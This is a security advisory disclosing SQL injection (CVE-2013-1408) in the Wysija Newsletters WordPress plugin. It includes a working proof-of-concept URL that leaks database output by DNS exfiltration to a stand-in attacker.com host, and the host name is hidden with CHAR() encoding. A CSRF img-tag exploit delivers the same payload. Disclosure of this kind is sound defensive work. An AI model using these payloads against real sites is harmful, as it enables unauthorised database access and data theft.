Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in Wysija Newsletters WordPress plugin, which can be exploited to perform SQL Injection attacks.


1) SQL Injections in Wysija Newsletters WordPress plugin: CVE-2013-1408

The vulnerabilities exist due to insufficient filtration of user-supplied input passed via the "search" and "orderby" HTTP GET parameters to the "/wp-admin/admin.php" script. A remote authenticated administrator can execute arbitrary SQL commands in application's database.

The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker):

http://[host]/wp-admin/admin.php?page=wysija_campaigns&orderby=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- 

This vulnerability could also be exploited by a remote non-authenticated attacker via CSRF vector, since the application is prone to cross-site request forgery attacks. In order to do so an attacker should trick the logged-in administrator into visiting a web page with CSRF exploit.

Basic CSRF exploit:

<img src="http://[host]/wp-admin/admin.php?page=wysija_campaigns&orderby=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- ">
